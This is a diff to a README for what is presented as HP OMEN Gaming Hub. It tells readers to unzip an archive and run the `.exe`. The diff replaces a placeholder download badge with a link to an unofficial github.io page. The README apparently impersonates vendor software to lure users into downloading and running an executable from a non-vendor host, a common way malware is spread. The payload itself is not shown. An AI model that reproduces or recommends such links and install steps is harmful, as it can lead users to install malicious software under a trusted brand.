@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install HP OMEN Gaming Hub and begin device setup automatically.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://hp-omen-gaming-hub.github.io/.github/)
 
 ## 📸 Overview
 ![omenhub-network](https://github.com/user-attachments/assets/095e25f8-0552-488d-aa9a-4d6db6b03810)
